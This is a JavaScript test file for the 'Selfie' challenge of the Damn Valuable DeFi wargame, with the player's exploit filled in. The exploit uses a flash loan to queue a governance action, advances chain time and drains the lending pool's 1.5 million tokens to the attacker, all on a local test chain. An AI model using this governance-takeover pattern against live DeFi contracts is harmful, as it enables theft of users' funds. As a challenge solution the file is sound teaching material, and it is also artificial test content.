const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const SelfieAttackFactory = await ethers.getContractFactory('SelfieAttack', attacker);

        selfieAttack = await SelfieAttackFactory.deploy(this.governance.address,this.token.address)

        let receipt =  await selfieAttack.connect(attacker).attack(this.pool.address,TOKENS_IN_POOL)

        receipt = await ethers.provider.getTransactionReceipt(receipt.hash);

        let abi = ["event ActionQueued(uint256 actionId, address indexed caller)"];
        let iface = new ethers.utils.Interface(abi);
        
        let log = iface.parseLog(receipt.logs[2]); // here you can add your own logic to find the correct log
        // const {donor, value, tokenID} = log.args;
        let id = log['args']
        console.log("------")
        console.log(id['actionId'])
        console.log("------")
        let actionId = id['actionId'].toNumber()
        console.log(actionId)
        // const {donor, value, tokenID} = log.args;
        // console.log("actionId",actionId);
        // console.log(Object.values(this.governance.interface.events)[0])


                    // console.log("***********************")
        // console.log(receipt.logs)
                    // console.log("***********************")
        // for(const log of receipt.logs){

        //     for(const abiEvent of Object.values(this.governance.interface.events)){

        //         // if(abiEvent.topics[0] == log.topics[0]){
        //         //     console.log("***********************")
        //         //     console.log("***********************")
        //         //     console.log("***********************")
        //         //     console.log("***********************")
        //         // }
        //     }
        // }
        //2 days fast forward so action can be executed
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days

        await this.governance.connect(attacker).executeAction(id['actionId'])
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
